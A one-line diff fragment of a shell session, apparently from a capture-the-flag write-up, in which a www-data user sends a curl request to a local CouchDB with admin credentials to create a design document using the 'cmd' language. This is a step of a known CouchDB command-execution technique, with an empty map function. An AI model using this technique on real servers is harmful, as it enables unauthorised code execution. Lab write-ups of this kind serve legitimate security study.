@@ -1,0 +1,1 @@
+d"}' {"error":"bad_request","reason":"Referer header required."} www-data@canape:/dev/shm$ curl -X POST 'http://0xdf:df@localhost:5984/df/_design/zero' -d '{"_id": "_design/zero", "views": {"df": {"map": ""} }, "language": "cmd"}'
